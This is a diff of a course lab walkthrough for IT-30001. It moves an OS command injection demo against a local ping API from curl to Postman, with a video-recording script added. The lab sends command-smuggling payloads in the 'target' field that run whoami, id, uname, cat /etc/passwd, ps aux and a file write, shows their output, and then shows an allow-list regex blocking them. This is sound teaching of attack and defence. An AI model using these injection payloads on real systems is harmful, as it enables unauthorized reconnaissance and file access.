@@ -1,297 +1,291 @@
-# OS Command Injection — Hands-On Walkthrough
+# OS Command Injection — Postman Walkthrough & Demonstration Guide
 
-> Run every command yourself, in order. Two terminals needed — one for the server, one for the commands.
-
-The outputs below are examples; usernames, system details, and timings depend on your local environment. See the [project README](README.md) for prerequisites.
+> **Course:** Cyber Security (IT-30001) | IIITA | Autumn 2026  
+> **Instructor:** Dr. Soumyadev Maity  
+> **Category:** OS Command Injection | **Variant 1:** In-Band (Command output returned)  
+> **Testing Tool:** Postman GUI
 
 ---
 
-## Terminal 1 — Start the Server
+## 🚀 Part 0: Start Your Backend Web Server
 
+Before using Postman, ensure the backend diagnostic service is running.
+
+Open your terminal and run:
 ```bash
-cd os-command-injection-variant_1
-bash run.sh
+cd /home/varun/os-command-injection-assignment
+./run.sh
 ```
 
 You should see:
-```
+```text
 ======================================================================
   IIITA Cyber Security Lab (IT-30001) - OS Command Injection
   Server starting on http://127.0.0.1:5000
 ======================================================================
  * Running on http://127.0.0.1:5000
 ```
-
-**Leave this running. Open a second terminal for everything below.**
-
----
-
-## Terminal 2 — All Commands Below
+> **Keep this terminal running in the background.**
 
 ---
 
-### Step 1: Normal Ping (Benign — No Injection)
+## 📥 Part 1: Open Postman & Import the Pre-Built Collection
 
-```bash
-curl -s -X POST http://127.0.0.1:5000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target": "127.0.0.1", "mode": "vulnerable"}' | python3 -m json.tool
-```
+1. Launch Postman:
+   ```bash
+   postman &
+   ```
+2. In Postman, click the **Import** button in the top-left corner.
+3. Select or drag & drop the pre-configured collection file:
+   ```
+   /home/varun/os-command-injection-assignment/postman_collection.json
+   ```
+4. Click **Import**.
 
-**What you see:**
-```json
-{
+You will now see a collection in your left sidebar titled:  
+**`OS Command Injection Lab (IT-30001)`** with all 8 requests ready to execute.
+
+---
+
+## ⚡ Part 2: Vulnerable Mode Demonstrations (In-Band Exploitation)
+
+Select each request from the imported collection in order, or follow the configurations below.
+
+---
+
+### Request 1: Benign Baseline Request (Normal Operation)
+
+* **Collection Item:** `1. Vulnerable - Benign Request`
+* **Method:** `POST`
+* **URL:** `http://127.0.0.1:5000/api/ping`
+* **Headers:** `Content-Type: application/json`
+* **Body (raw JSON):**
+  ```json
+  {
+    "target": "127.0.0.1",
+    "mode": "vulnerable"
+  }
+  ```
+* **Action:** Click **Send**.
+* **Expected Status:** `200 OK`
+* **Response Body (in-band output):**
+  ```json
+  {
     "status": "success",
     "mode": "vulnerable",
     "executed_command": "ping -c 2 127.0.0.1",
-    "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ...\n64 bytes from 127.0.0.1: icmp_seq=2 ...\n\n--- 127.0.0.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss ...\n",
+    "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n...\n2 packets transmitted, 2 received, 0% packet loss\n",
     "returncode": 0
-}
-```
-
-**What it means:** The server ran `ping -c 2 127.0.0.1` and returned the output. This is normal, expected behaviour. No attack yet.
+  }
+  ```
+* **Explanation:** Normal ping functionality. No attack payload entered.
 
 ---
 
-### Step 2: Inject `whoami` (Find Out Who the Server Runs As)
+### Request 2: Exploit 1 — Current User Extraction (`whoami`)
 
-```bash
-curl -s -X POST http://127.0.0.1:5000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target": "127.0.0.1; whoami", "mode": "vulnerable"}' | python3 -m json.tool
-```
-
-**What you see:** Look at `executed_command` and the end of `output`:
-```json
-{
+* **Collection Item:** `2. Vulnerable - Exploit whoami`
+* **Method:** `POST`
+* **URL:** `http://127.0.0.1:5000/api/ping`
+* **Body (raw JSON):**
+  ```json
+  {
+    "target": "127.0.0.1; whoami",
+    "mode": "vulnerable"
+  }
+  ```
+* **Action:** Click **Send**.
+* **Expected Status:** `200 OK`
+* **Response Body:**
+  ```json
+  {
+    "status": "success",
+    "mode": "vulnerable",
     "executed_command": "ping -c 2 127.0.0.1; whoami",
-    "output": "PING 127.0.0.1 ... 2 packets transmitted, 2 received ...\nvarun\n"
-}
-```
-
-**What it means:** The semicolon (`;`) told the shell "run the next command too." The server executed `whoami` after `ping` and returned the username `varun` in the response. **This is the injection — we just ran an arbitrary OS command.**
-
----
-
-### Step 3: Inject `id` and `uname -a` (Full System Recon)
-
-```bash
-curl -s -X POST http://127.0.0.1:5000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target": "127.0.0.1; id; uname -a", "mode": "vulnerable"}' | python3 -m json.tool
-```
-
-**What you see** (at the end of `output`):
-```
-uid=1000(varun) gid=982(users) groups=982(users),959(docker),963(ollama),998(wheel)
-Linux archlinux 6.12.1-arch1-1 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
-```
-
-**What it means:** We now know the user ID, every group the server user belongs to, the exact Linux kernel version, and the CPU architecture. An attacker uses this for privilege escalation planning.
+    "output": "PING 127.0.0.1 ... 2 packets transmitted, 2 received, 0% packet loss ...\nvarun\n",
+    "returncode": 0
+  }
+  ```
+* **What Just Happened:** The semicolon `;` acts as a command delimiter in `/bin/sh`. The server executed `whoami` after `ping` and returned the username `varun` directly in the JSON response (**In-Band output**).
 
 ---
 
-### Step 4: Read a Sensitive File (`/etc/passwd`)
+### Request 3: Exploit 2 — System Reconnaissance (`id; uname -a`)
 
-```bash
-curl -s -X POST http://127.0.0.1:5000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target": "127.0.0.1; cat /etc/passwd | head -5", "mode": "vulnerable"}' | python3 -m json.tool
-```
-
-**What you see** (at the end of `output`):
-```
-root:x:0:0::/root:/bin/bash
-bin:x:1:1::/:/usr/bin/nologin
-daemon:x:2:2::/:/usr/bin/nologin
-mail:x:8:12::/var/spool/mail:/usr/bin/nologin
-ftp:x:14:11::/srv/ftp:/usr/bin/nologin
-```
-
-**What it means:** The attacker just read the system's user account database. On a production server this is a severe information disclosure.
-
----
-
-### Step 5: List Running Processes (`ps aux`)
-
-```bash
-curl -s -X POST http://127.0.0.1:5000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target": "127.0.0.1 && ps aux | head -6", "mode": "vulnerable"}' | python3 -m json.tool
-```
-
-**What it means:** The attacker can see every running process — databases, other web apps, cron jobs — to find further attack targets. Notice `&&` also works as a command separator, not just `;`.
+* **Collection Item:** `3. Vulnerable - Exploit id & uname -a`
+* **Method:** `POST`
+* **URL:** `http://127.0.0.1:5000/api/ping`
+* **Body (raw JSON):**
+  ```json
+  {
+    "target": "127.0.0.1; id; uname -a",
+    "mode": "vulnerable"
+  }
+  ```
+* **Action:** Click **Send**.
+* **Expected Status:** `200 OK`
+* **Response Body (In-Band Evidence):**
+  ```text
+  ...
+  uid=1000(varun) gid=982(users) groups=982(users),959(docker),963(ollama),998(wheel)
+  Linux archlinux 6.12.1-arch1-1 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
+  ```
+* **What This Proves:** An attacker has enumerated the user privileges, group memberships, kernel version, and architecture of the server host.
 
 ---
 
-### Step 6: List Files in the Current Directory (`ls -la`)
+### Request 4: Exploit 3 — Arbitrary File Read (`/etc/passwd`)
 
-```bash
-curl -s -X POST http://127.0.0.1:5000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target": "127.0.0.1; ls -la", "mode": "vulnerable"}' | python3 -m json.tool
-```
-
-**What it means:** The attacker can browse the server's filesystem — find config files, database credentials, source code, SSH keys, etc.
-
----
-
-### Step 7: Prove Arbitrary Write Access (`echo` to a file)
-
-```bash
-curl -s -X POST http://127.0.0.1:5000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target": "127.0.0.1; echo HACKED > /tmp/pwned.txt; cat /tmp/pwned.txt", "mode": "vulnerable"}' | python3 -m json.tool
-```
-
-**What you see** (at the end of `output`):
-```
-HACKED
-```
-
-Verify the file was actually created:
-```bash
-cat /tmp/pwned.txt
-```
-```
-HACKED
-```
-
-**What it means:** The attacker can write arbitrary files. They could deface a website, plant a backdoor, or overwrite configuration.
-
-Clean up:
-```bash
-rm /tmp/pwned.txt
-```
+* **Collection Item:** `4. Vulnerable - Exploit cat passwd`
+* **Method:** `POST`
+* **URL:** `http://127.0.0.1:5000/api/ping`
+* **Body (raw JSON):**
+  ```json
+  {
+    "target": "127.0.0.1; cat /etc/passwd | head -5",
+    "mode": "vulnerable"
+  }
+  ```
+* **Action:** Click **Send**.
+* **Expected Status:** `200 OK`
+* **Response Body (In-Band Evidence):**
+  ```text
+  root:x:0:0::/root:/bin/bash
+  bin:x:1:1::/:/usr/bin/nologin
+  daemon:x:2:2::/:/usr/bin/nologin
+  mail:x:8:12::/var/spool/mail:/usr/bin/nologin
+  ftp:x:14:11::/srv/ftp:/usr/bin/nologin
+  ```
+* **Impact:** Sensitive system file disclosure. The attacker has dumped the system user account registry.
 
 ---
 
-## Now Switch to the Mitigated Endpoint
+### Request 5: Exploit 4 — Process Enumeration (`ps aux`)
 
-The exact same payloads, but with `"mode": "mitigated"`.
+* **Collection Item:** `5. Vulnerable - Exploit ps aux`
+* **Method:** `POST`
+* **URL:** `http://127.0.0.1:5000/api/ping`
+* **Body (raw JSON):**
+  ```json
+  {
+    "target": "127.0.0.1 && ps aux | head -6",
+    "mode": "vulnerable"
+  }
+  ```
+* **Action:** Click **Send**.
+* **Expected Status:** `200 OK`
+* **Observation:** The `&&` conditional operator also triggers injection, returning active system processes.
 
 ---
 
-### Step 8: Same `whoami` Exploit — Now Blocked
+## 🛡️ Part 3: Mitigated Mode Demonstrations (Defense in Action)
 
-```bash
-curl -s -X POST http://127.0.0.1:5000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target": "127.0.0.1; whoami", "mode": "mitigated"}' | python3 -m json.tool
-```
+Now test the exact same exploit payloads with `"mode": "mitigated"`.
 
-**What you see:**
-```json
-{
+---
+
+### Request 6: Mitigated Defense Test — `whoami` Blocked
+
+* **Collection Item:** `6. Mitigated - Blocked Exploit whoami`
+* **Method:** `POST`
+* **URL:** `http://127.0.0.1:5000/api/ping`
+* **Body (raw JSON):**
+  ```json
+  {
+    "target": "127.0.0.1; whoami",
+    "mode": "mitigated"
+  }
+  ```
+* **Action:** Click **Send**.
+* **Expected Status:** **`400 BAD REQUEST`** 🔴
+* **Response Body:**
+  ```json
+  {
     "status": "blocked",
     "mode": "mitigated",
     "executed_command": null,
     "message": "SECURITY ALERT: Request blocked by allow-list filter. Shell metacharacters or invalid hostnames are strictly prohibited.",
     "output": "[SECURITY_FILTER_TRIGGERED] Input '127.0.0.1; whoami' rejected by allow-list pattern r'^[a-zA-Z0-9.-]+$'."
-}
-```
-
-**What it means:** The regex `^[a-zA-Z0-9.-]+$` detected the `;` and space — characters not allowed in a hostname. The request was rejected with HTTP 400. **No command was executed at all.**
-
----
-
-### Step 9: Same Full Recon Exploit — Blocked
-
-```bash
-curl -s -X POST http://127.0.0.1:5000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target": "127.0.0.1; id; uname -a", "mode": "mitigated"}' | python3 -m json.tool
-```
-
-**What you see:** Same `"status": "blocked"` response. Zero output from any injected command.
+  }
+  ```
+* **Why It Was Blocked:**
+  1. **Layer 1 (Allow-List Regex):** The regex `^[a-zA-Z0-9.-]+$` rejected `;` and space characters.
+  2. **Layer 2 (Parameterized Execution):** Uses `shell=False` with `cmd_args = ["ping", "-c", "2", target]` so no shell interpreter is ever spawned.
 
 ---
 
-### Step 10: Same `/etc/passwd` Exploit — Blocked
+### Request 7: Mitigated Defense Test — Reconnaissance Blocked
 
-```bash
-curl -s -X POST http://127.0.0.1:5000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target": "127.0.0.1; cat /etc/passwd | head -5", "mode": "mitigated"}' | python3 -m json.tool
-```
-
-**What you see:** `"status": "blocked"`. No file contents leaked.
-
----
-
-### Step 11: Same File Write Exploit — Blocked
-
-```bash
-curl -s -X POST http://127.0.0.1:5000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target": "127.0.0.1; echo HACKED > /tmp/pwned.txt", "mode": "mitigated"}' | python3 -m json.tool
-```
-
-**What you see:** `"status": "blocked"`. Verify no file was created:
-```bash
-cat /tmp/pwned.txt 2>&1
-```
-```
-cat: /tmp/pwned.txt: No such file or directory
-```
+* **Collection Item:** `7. Mitigated - Blocked Exploit id & uname`
+* **Method:** `POST`
+* **URL:** `http://127.0.0.1:5000/api/ping`
+* **Body (raw JSON):**
+  ```json
+  {
+    "target": "127.0.0.1; id; uname -a",
+    "mode": "mitigated"
+  }
+  ```
+* **Action:** Click **Send**.
+* **Expected Status:** **`400 BAD REQUEST`** 🔴
+* **Result:** Blocked immediately. Zero command execution occurs on the server.
 
 ---
 
-### Step 12: Legitimate Request Still Works in Mitigated Mode
+### Request 8: Mitigated Functional Test — Legitimate Ping Allowed
 
-```bash
-curl -s -X POST http://127.0.0.1:5000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target": "127.0.0.1", "mode": "mitigated"}' | python3 -m json.tool
-```
-
-**What you see:**
-```json
-{
+* **Collection Item:** `8. Mitigated - Legitimate Ping Allowed`
+* **Method:** `POST`
+* **URL:** `http://127.0.0.1:5000/api/ping`
+* **Body (raw JSON):**
+  ```json
+  {
+    "target": "127.0.0.1",
+    "mode": "mitigated"
+  }
+  ```
+* **Action:** Click **Send**.
+* **Expected Status:** **`200 OK`** 🟢
+* **Response Body:**
+  ```json
+  {
     "status": "success",
     "mode": "mitigated",
     "executed_command": "ping -c 2 127.0.0.1",
     "output": "PING 127.0.0.1 ... 2 packets transmitted, 2 received, 0% packet loss ...",
     "returncode": 0
-}
-```
-
-**What it means:** The mitigation only blocks malicious input. Normal hostnames and IPs work perfectly. The application is still functional.
-
----
-
-### Step 13: Test with a Domain Name (Mitigated Mode)
-
-```bash
-curl -s -X POST http://127.0.0.1:5000/api/ping \
-  -H "Content-Type: application/json" \
-  -d '{"target": "google.com", "mode": "mitigated"}' | python3 -m json.tool
-```
-
-**What you see:** Normal ping output for `google.com` (or a DNS resolution error if offline). The point is: the regex allows valid FQDNs like `google.com` and `my-server.example.org`.
+  }
+  ```
+* **What This Proves:** The mitigation does not break legitimate business functionality. Safe hostnames pass the allow-list filter and execute properly.
 
 ---
 
-## Summary Table
+## 📊 Summary Table of Postman Requests
 
-| Step | Payload | Mode | Result |
-|:-----|:--------|:-----|:-------|
-| 1 | `127.0.0.1` | vulnerable | ✅ Normal ping output |
-| 2 | `127.0.0.1; whoami` | vulnerable | ⚠️ **INJECTED** — returns username |
-| 3 | `127.0.0.1; id; uname -a` | vulnerable | ⚠️ **INJECTED** — returns uid, groups, kernel |
-| 4 | `127.0.0.1; cat /etc/passwd \| head -5` | vulnerable | ⚠️ **INJECTED** — dumps system users |
-| 5 | `127.0.0.1 && ps aux \| head -6` | vulnerable | ⚠️ **INJECTED** — lists processes |
-| 6 | `127.0.0.1; ls -la` | vulnerable | ⚠️ **INJECTED** — lists server files |
-| 7 | `127.0.0.1; echo HACKED > /tmp/pwned.txt` | vulnerable | ⚠️ **INJECTED** — writes a file to disk |
-| 8 | `127.0.0.1; whoami` | mitigated | 🛡️ **BLOCKED** — HTTP 400 |
-| 9 | `127.0.0.1; id; uname -a` | mitigated | 🛡️ **BLOCKED** — HTTP 400 |
-| 10 | `127.0.0.1; cat /etc/passwd \| head -5` | mitigated | 🛡️ **BLOCKED** — HTTP 400 |
-| 11 | `127.0.0.1; echo HACKED > /tmp/pwned.txt` | mitigated | 🛡️ **BLOCKED** — HTTP 400 |
-| 12 | `127.0.0.1` | mitigated | ✅ Normal ping — still works |
-| 13 | `google.com` | mitigated | ✅ Normal ping — still works |
+| # | Request Name | Mode | Payload | Expected HTTP Status | Security Outcome |
+|:---|:---|:---|:---|:---:|:---|
+| 1 | Benign Request | `vulnerable` | `127.0.0.1` | `200 OK` | Normal ping executed |
+| 2 | Exploit whoami | `vulnerable` | `127.0.0.1; whoami` | `200 OK` | ⚠️ **In-Band Exploit**: Username returned |
+| 3 | Exploit id & uname | `vulnerable` | `127.0.0.1; id; uname -a` | `200 OK` | ⚠️ **In-Band Exploit**: User IDs & kernel info returned |
+| 4 | Exploit cat passwd | `vulnerable` | `127.0.0.1; cat /etc/passwd \| head -5` | `200 OK` | ⚠️ **In-Band Exploit**: File contents leaked |
+| 5 | Exploit ps aux | `vulnerable` | `127.0.0.1 && ps aux \| head -6` | `200 OK` | ⚠️ **In-Band Exploit**: Process listing returned |
+| 6 | Blocked whoami | `mitigated` | `127.0.0.1; whoami` | **`400 Bad Request`** | 🛡️ **Blocked by security filter** |
+| 7 | Blocked id & uname | `mitigated` | `127.0.0.1; id; uname -a` | **`400 Bad Request`** | 🛡️ **Blocked by security filter** |
+| 8 | Legitimate Ping | `mitigated` | `127.0.0.1` | `200 OK` | 🟢 Legitimate input passes safely |
 
 ---
 
-## Stop the Server
+## 🎥 Video Recording Guide (Using Postman)
 
-Go back to Terminal 1 and press `Ctrl+C`.
+When recording your 2.5-minute video demonstration:
+1. **[0:00 - 0:25] Intro:** Introduce yourself (Varun, IIT2024150, IT-30001 Cyber Security, OS Command Injection, Variant 1 In-Band).
+2. **[0:25 - 0:50] Vulnerable Code:** Briefly show `app.py` lines 36–45 (`f"ping -c 2 {target}"`, `shell=True`).
+3. **[0:50 - 1:30] Postman Exploit Demo:**
+   - In Postman, fire **Request 1** (`127.0.0.1`) → show normal `200 OK`.
+   - Fire **Request 2** (`127.0.0.1; whoami`) → point out the injected username `varun` in the response body!
+   - Fire **Request 3** (`127.0.0.1; id; uname -a`) → point out `uid=1000` and the Linux kernel version.
+4. **[1:30 - 2:05] Postman Mitigation Demo:**
+   - Switch to **Request 6** (`mode: mitigated` with `127.0.0.1; whoami`).
+   - Click **Send** → Highlight the red **`400 Bad Request`** badge and the `SECURITY ALERT` message.
+   - Fire **Request 8** (`127.0.0.1` in mitigated mode) → show that legitimate requests still get `200 OK`.
+5. **[2:05 - 2:30] Theory Recap:** State the 4 defenses from slides (Avoid the shell, Parameterized execution via `shell=False`, Allow-list regex, Principle of Least Privilege).
